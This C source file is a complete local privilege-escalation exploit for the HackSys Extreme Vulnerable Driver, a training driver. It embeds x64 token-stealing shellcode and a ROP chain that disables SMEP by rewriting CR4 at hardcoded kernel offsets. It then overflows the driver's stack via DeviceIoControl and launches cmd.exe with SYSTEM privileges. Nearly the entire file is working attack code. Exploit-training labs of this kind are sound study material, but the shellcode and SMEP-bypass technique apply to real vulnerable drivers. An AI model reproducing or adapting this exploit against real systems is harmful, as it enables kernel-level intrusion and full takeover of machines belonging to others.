#include <windows.h>
#include <stdio.h>
#include "HS-StackOverflowX64.h"


PUCHAR GetKernelBase()
{
	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;
	PUCHAR kernelBase = NULL;

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL) {
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo)
	{
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);

	kernelBase = ModuleInfo->Module[0].ImageBase;
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);

	return kernelBase;
}


int wmain(int argc, wchar_t* argv[])
{
	LPVOID lpvPayload;
	HANDLE hDevice;
	LPCWSTR lpDeviceName = L"\\\\.\\HacksysExtremeVulnerableDriver";
	BOOL bResult = FALSE;
	PUCHAR pKernelBase = NULL;
	ROP DisableSMEP, EnableSMEP;

	CHAR ShellCode[] = 
		"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"		// mov rdx, [gs:188h]		; Get _ETHREAD pointer from KPCR
		"\x4C\x8B\x82\xB8\x00\x00\x00"			// mov r8, [rdx + b8h]		; _EPROCESS (kd> u PsGetCurrentProcess)
		"\x4D\x8B\x88\xe8\x02\x00\x00"			// mov r9, [r8 + 2e8h]		; ActiveProcessLinks list head
		"\x49\x8B\x09"					// mov rcx, [r9]		; Follow link to first process in list
		//find_system_proc:
		"\x48\x8B\x51\xF8"				// mov rdx, [rcx - 8]		; Offset from ActiveProcessLinks to UniqueProcessId
		"\x48\x83\xFA\x04"				// cmp rdx, 4			; Process with ID 4 is System process
		"\x74\x05"					// jz found_system		; Found SYSTEM token
		"\x48\x8B\x09"					// mov rcx, [rcx]		; Follow _LIST_ENTRY Flink pointer
		"\xEB\xF1"					// jmp find_system_proc		; Loop
		//found_system:
		"\x48\x8B\x41\x60"				// mov rax, [rcx + 60h]		; Offset from ActiveProcessLinks to Token
		"\x24\xF0"					// and al, 0f0h			; Clear low 4 bits of _EX_FAST_REF structure
		"\x49\x89\x80\x48\x03\x00\x00"			// mov [r8 + 348h], rax		; Copy SYSTEM token to current process's token
		//recover:
		"\x48\x83\xc4\x18"				// add rsp, 18h			; Set Stack Pointer to SMEP enable ROP chain
		"\x48\xC7\xC6\x01\x00\x00\x00"			// mov rsi, 0x1			; Restore rsi register
		"\x48\x31\xFF"					// xor rdi, rdi			; Restore rdi register
		"\x48\x31\xC0"					// xor rax, rax			; NTSTATUS Status = STATUS_SUCCESS
		"\xc3"						// ret				; Enable SMEP and Return to IrpDeviceIoCtlHandler+0xe2
		;

	wprintf(L"    __ __         __    ____       	\n");
	wprintf(L"   / // /__ _____/ /__ / __/_ _____	\n");
	wprintf(L"  / _  / _ `/ __/  '_/_\\ \\/ // (_-<	\n");
	wprintf(L" /_//_/\\_,_/\\__/_/\\_\\/___/\\_, /___/	\n");
	wprintf(L"                         /___/     	\n");
	wprintf(L"					\n");
	wprintf(L"	 Extreme Vulnerable Driver  \n");
	wprintf(L"	    Stack Overflow X64	\n\n");

	wprintf(L" [*] Allocating Ring0 Payload");

	lpvPayload = VirtualAlloc(
		NULL,				// Next page to commit
		sizeof(ShellCode),		// Page size, in bytes
		MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
		PAGE_EXECUTE_READWRITE);	// Read/write access
	if (lpvPayload == NULL)
	{
		wprintf(L" -> Unable to reserve Memory!\n\n");
		exit(1);
	}

	wprintf(L" -> Done!\n");

	memcpy(lpvPayload, ShellCode, sizeof(ShellCode));

	wprintf(L" [+] Ring0 Payload available at: 0x%p \n", lpvPayload);
	wprintf(L"\n [*] Trying to get a handle to the following Driver: %ls", lpDeviceName);

	hDevice = CreateFile(lpDeviceName,			// Name of the write
		GENERIC_READ | GENERIC_WRITE,			// Open for reading/writing
		FILE_SHARE_WRITE,				// Allow Share
		NULL,						// Default security
		OPEN_EXISTING,					// Opens a file or device, only if it exists.
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,	// Normal file
		NULL);						// No attr. template

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		wprintf(L" -> Unable to get Driver handle!\n\n");
		exit(1);
	}

	wprintf(L" -> Done!\n");
	wprintf(L" [+] Our Device Handle: 0x%p \n\n", hDevice);

	wprintf(L" [*] Preparing SMEP Bypass ROP Chain");

	pKernelBase = GetKernelBase();
	DisableSMEP.PopRcxRet = pKernelBase + 0x79431;
	DisableSMEP.Cr4RegValue = (PUCHAR)0x506f8;
	DisableSMEP.MovCr4EcxRet = pKernelBase + 0x747ee;

	EnableSMEP.PopRcxRet = pKernelBase + 0x79431;
	EnableSMEP.Cr4RegValue = (PUCHAR)0x1506f8;
	EnableSMEP.MovCr4EcxRet = pKernelBase + 0x747ee;

	CHAR *chBuffer;
	chBuffer = (CHAR *)malloc(2152);
	SecureZeroMemory(chBuffer, 2152);
	memset(chBuffer, 0x41, 2152);
	memcpy(chBuffer + 2072, &DisableSMEP, sizeof(ROP));
	memcpy(chBuffer + 2096, &lpvPayload, sizeof(LPVOID));
	memcpy(chBuffer + 2128, &EnableSMEP, sizeof(ROP));

	wprintf(L" -> Done!\n");
	wprintf(L" [+] Kernel Base Address is at: 0x%p \n", pKernelBase);
	wprintf(L" [+] pop rcx ; ret -> Gadget available at: 0x%p \n", DisableSMEP.PopRcxRet);
	wprintf(L" [+] New value of CR4 register: 0x%p \n", DisableSMEP.Cr4RegValue);
	wprintf(L" [+] mov cr4, ecx ; ret -> Gadget available at: 0x%p \n\n", DisableSMEP.MovCr4EcxRet);

	wprintf(L" [*] Lets send some Bytes to our Driver, bypass SMEP and execute our Usermode Shellcode");

	DWORD junk = 0;                     	// Discard results

	bResult = DeviceIoControl(hDevice,	// Device to be queried
		0x222003,			// Operation to perform
		chBuffer, 2152,			// Input Buffer
		NULL, 0,			// Output Buffer
		&junk,				// # Bytes returned
		(LPOVERLAPPED)NULL);		// Synchronous I/O	
	if (!bResult) {
		wprintf(L" -> Failed to send Data!\n\n");
		CloseHandle(hDevice);
		exit(1);
	}

	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

	wprintf(L" -> Done!\n\n");

	CloseHandle(hDevice);

}
